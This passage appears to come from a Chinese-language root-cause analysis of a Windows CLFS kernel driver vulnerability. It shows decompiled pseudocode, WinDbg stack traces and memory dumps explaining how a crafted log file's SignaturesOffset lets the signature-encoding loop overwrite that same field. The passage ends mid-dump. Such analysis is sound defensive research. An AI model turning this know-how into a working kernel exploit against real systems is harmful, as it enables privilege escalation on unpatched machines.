CClfsLogFcbPhysical<span style="color:#f92672">::</span><span style="color:#a6e22e">Initialize</span>(</span></span><span style="display:flex;"><span> ULONG_PTR a1,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> a4,</span></span><span style="display:flex;"><span> ULONG DesiredShareAccess,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> a6,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> a7,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> a8,</span></span><span style="display:flex;"><span> PFILE_OBJECT FileObject,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span> a10)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">AddRef</span>(v25);</span></span><span style="display:flex;"><span> EventObject<span style="color:#f92672">=</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">OpenImage</span>(<span style="color:#75715e">// 打开现有日志文件会调用这里、</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#f92672">*</span>(CClfsBaseFilePersisted<span style="color:#f92672">**</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">680</span>),</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>Destination,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">const</span><span style="color:#66d9ef">struct</span> _CLFS_FILTER_CONTEXT<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v88,</span></span><span style="display:flex;"><span> a10,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v94);</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">AcquireClientContext</span>(<span style="color:#f92672">*</span>(PERESOURCE<span style="color:#f92672">**</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">680</span>),<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&amp;</span>v77);<span style="color:#75715e">// 获取客户端上下文</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (v77<span style="color:#f92672">-></span>eState<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0x20</span>)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(ULONG_PTR))(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)a1<span style="color:#f92672">+</span><span style="color:#ae81ff">312</span>i64))(a1) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> CClfsLogFcbPhysical<span style="color:#f92672">::</span><span style="color:#a6e22e">ResetLog</span>((CClfsLogFcbPhysical<span style="color:#f92672">*</span>)a1);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(a1<span style="color:#f92672">+</span><span style="color:#ae81ff">348</span>)<span style="color:#f92672">|=</span><span style="color:#ae81ff">0x40u</span>;</span></span><span style="display:flex;"><span> v39<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)EventObject;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>继续调试，调试器在<code>ClfsEncodeBlockPrivate</code>断下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> k</span></span><span style="display:flex;"><span><span style="color:#75715e"># Child-SP RetAddr Call Site</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">00</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53916f</span><span style="color:#ae81ff">70</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d6802d CLFS<span style="color:#f92672">!</span>ClfsEncodeBlockPrivate<span style="color:#f92672">+</span><span style="color:#ae81ff">0xee</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53916f</span>b0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d92232 CLFS<span style="color:#f92672">!</span>ClfsEncodeBlock<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53916f</span>e0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d899a0 CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>WriteMetadataBlock<span style="color:#f92672">+</span><span style="color:#ae81ff">0x152</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917070</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d6161f CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>FlushImage<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">539170</span>b0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d63701 CLFS<span style="color:#f92672">!</span>CClfsLogFcbPhysical<span style="color:#f92672">::</span>FlushMetadata<span style="color:#f92672">+</span><span style="color:#ae81ff">0xef</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917100</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d8eaeb CLFS<span style="color:#f92672">!</span>CClfsLogFcbPhysical<span style="color:#f92672">::</span>Initialize<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc85</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917240</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d90a2b CLFS<span style="color:#f92672">!</span>CClfsRequest<span style="color:#f92672">::</span>Create<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4ef</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917390</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d907f7 CLFS<span style="color:#f92672">!</span>CClfsRequest<span style="color:#f92672">::</span>Dispatch<span style="color:#f92672">+</span><span style="color:#ae81ff">0x97</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">08</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">539173e0</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">62</span>d90747 CLFS<span style="color:#f92672">!</span>ClfsDispatchIoRequest<span style="color:#f92672">+</span><span style="color:#ae81ff">0x87</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">09</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917430</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">668</span>abac5 CLFS<span style="color:#f92672">!</span>CClfsDriver<span style="color:#f92672">::</span>LogIoDispatch<span style="color:#f92672">+</span><span style="color:#ae81ff">0x27</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>a fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917460</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">668629</span>a4 nt<span style="color:#f92672">!</span>IofCallDriver<span style="color:#f92672">+</span><span style="color:#ae81ff">0x55</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>b fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">539174</span>a0 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">66</span>bf1dfd nt<span style="color:#f92672">!</span>IoCallDriverWithTracing<span style="color:#f92672">+</span><span style="color:#ae81ff">0x34</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>c fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">539174f</span><span style="color:#ae81ff">0</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">66</span>c20cbe nt<span style="color:#f92672">!</span>IopParseDevice<span style="color:#f92672">+</span><span style="color:#ae81ff">0x117d</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>d fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917660</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">66</span>c01d3a nt<span style="color:#f92672">!</span>ObpLookupObjectName<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3fe</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>e fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917830</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">66</span>c88f0f nt<span style="color:#f92672">!</span>ObOpenObjectByNameEx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1fa</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0f</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917960</span> fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">66</span>c88ae9 nt<span style="color:#f92672">!</span>IopCreateFile<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40f</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">10</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917</span>a00 fffff806<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">66</span>a0a2b5 nt<span style="color:#f92672">!</span>NtCreateFile<span style="color:#f92672">+</span><span style="color:#ae81ff">0x79</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">11</span> fffff389<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">53917</span>a90<span style="color:#ae81ff">00007ff</span>a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">91</span>b0d9e4 nt<span style="color:#f92672">!</span>KiSystemServiceCopyEnd<span style="color:#f92672">+</span><span style="color:#ae81ff">0x25</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">12</span><span style="color:#ae81ff">0000005</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">`</span>ec6fe888<span style="color:#ae81ff">00007ff</span>a<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8</span>bc92199 ntdll<span style="color:#f92672">!</span>NtCreateFile<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">13</span><span style="color:#ae81ff">0000005</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">`</span>ec6fe890<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">0x00007ffa</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8</span>bc92199</span></span></code></pre></div><p><code>ClfsEncodeBlockPrivate</code>伪代码：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">ClfsEncodeBlockPrivate</span>(</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _CLFS_LOG_BLOCK_HEADER<span style="color:#f92672">*</span>a1,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,</span></span><span style="display:flex;"><span> UCHAR a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span> a4)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> ClientId_low;<span style="color:#75715e">// eax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>......</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ClientId_low<span style="color:#f92672">=</span><span style="color:#a6e22e">LOWORD</span>(a1<span style="color:#f92672">-></span>ClientId);</span></span><span style="display:flex;"><span> v21[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#75715e">// 段签名数组</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(_WORD)ClientId_low<span style="color:#f92672">||</span><span style="color:#a6e22e">HIWORD</span>(a1<span style="color:#f92672">-></span>ClientId)<span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span>)ClientId_low<span style="color:#f92672">||</span> ClientId_low<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">9</span><span style="color:#f92672">></span> a2 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929418</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( a4<span style="color:#f92672">></span><span style="color:#ae81ff">0x10u</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3221225485</span>i64;</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#ae81ff">65809</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">_bittest</span>(<span style="color:#f92672">&amp;</span>v8, a4) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3221225485</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (a1<span style="color:#f92672">-></span>Checksum<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929418</span>i64;</span></span><span style="display:flex;"><span> SignaturesOffset<span style="color:#f92672">=</span> a1<span style="color:#f92672">-></span>SignaturesOffset;</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> a2<span style="color:#f92672">>></span><span style="color:#ae81ff">9</span>;<span style="color:#75715e">// 3D</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> a1<span style="color:#f92672">-></span>Usn<span style="color:#f92672">=</span> a3;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HIBYTE</span>(v22)<span style="color:#f92672">=</span> a3;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ULongAdd</span>(SignaturesOffset,<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span> (a2<span style="color:#f92672">>></span><span style="color:#ae81ff">9</span>), v21)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span> v21[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">&lt;</span> v11<span style="color:#f92672">||</span> (v11<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">7</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span> v21[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">></span> a2 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929418</span>i64;</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v10 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>i64;</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span>;</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">!=</span> v15 )</span></span><span style="display:flex;"><span> v16<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v15 )</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v18<span style="color:#f92672">=</span> v17<span style="color:#f92672">|</span> v16;</span></span><span style="display:flex;"><span> v19<span style="color:#f92672">=</span> v15<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">9</span>;<span style="color:#75715e">// 段偏移</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">LOBYTE</span>(v22)<span style="color:#f92672">=</span> a4<span style="color:#f92672">|</span> v18;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>v15;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_WORD<span style="color:#f92672">*</span>)(v14<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_WORD<span style="color:#f92672">*</span>)(v19<span style="color:#f92672">+</span> v13<span style="color:#f92672">+</span><span style="color:#ae81ff">510</span>);<span style="color:#75715e">// 循环相加，第14个段的签名会覆盖到SignatureOffset</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_WORD<span style="color:#f92672">*</span>)((<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v19<span style="color:#f92672">+</span> v13<span style="color:#f92672">+</span><span style="color:#ae81ff">510</span>)<span style="color:#f92672">=</span> v22;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v15<span style="color:#f92672">&lt;</span> v10 );</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">=</span> v12<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFFFFFFFC</span><span style="color:#f92672">|</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>该代码获取<code>LOG_BLOCK_HEADER→SignaturesOffset</code>的值，在PoC内已被设为0x50，而后循环读取每个扇区的签名并覆盖到<code>SignaturesOffset</code>偏移处，此时将从0x50开始写入数据，每次写入0x2个字节。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">?</span><span style="color:#ae81ff">0xd</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span></span></span><span style="display:flex;"><span>Evaluate expression:<span style="color:#ae81ff">26</span><span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000001</span>a</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> rr11</span></span><span style="display:flex;"><span>r11<span style="color:#f92672">=</span>ffffab0523ecf06a</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">?</span>r11<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1a</span></span></span><span style="display:flex;"><span>Evaluate expression:<span style="color:#f92672">-</span><span style="color:#ae81ff">93436410793904</span><span style="color:#f92672">=</span> ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf050</span></span></code></pre></div><p>在第十三个扇区覆盖时，偏移已经到了<code>SignatureOffset</code>处，第十三个扇区签名为0x0050，所以<code>SignatureOffset</code> 低2位为0050</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">?</span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf050<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xc</span></span></span><span style="display:flex;"><span>Evaluate expression:<span style="color:#f92672">-</span><span style="color:#ae81ff">93436410793880</span><span style="color:#f92672">=</span> ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf068</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span> CLFS_LOG_BLOCK_HEADER struc ; (<span style="color:#66d9ef">sizeof</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0x70</span>, align<span style="color:#f92672">=</span><span style="color:#ae81ff">0x8</span>, copyof_491)</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span> MajorVersion db<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span> MinorVersion db<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000002</span> Usn db<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000003</span> db<span style="color:#f92672">?</span> ; undefined</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000004</span> ClientId dd<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000</span><span style="color:#ae81ff">8</span> TotalSectorCount dw<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000</span>A ValidSectorCount dw<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000</span>C Padding dd<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000010</span> Checksum dd<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000014</span> Flags dd<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000001</span><span style="color:#ae81ff">8</span> CurrentLsn CLFS_LSN<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000020</span> NextLsn CLFS_LSN<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000002</span><span style="color:#ae81ff">8</span> RecordOffsets dd<span style="color:#ae81ff">16</span><span style="color:#a6e22e">dup</span>(<span style="color:#f92672">?</span>)</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000006</span><span style="color:#ae81ff">8</span> SignaturesOffset dd<span style="color:#f92672">?</span></span></span></code></pre></div><p>第十四个扇区签名已经被覆盖为<code>0xFFFF</code>，再将第十四个扇区覆盖在<code>SignatureOffset</code>高两位字节，<code>SignatureOffset</code>值变为<code>0XFFFF0050</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db ffffab0523ecf000 L0x80</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf000<span style="color:#ae81ff">15</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">00</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ....<span style="color:#f92672">=</span>.<span style="color:#f92672">=</span>.........</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf010<span style="color:#ae81ff">02</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ff ff ff ff ................</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf020<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ff ff ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">70</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........p.......</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf030<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf040<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffab05<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23</span>ecf050<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span 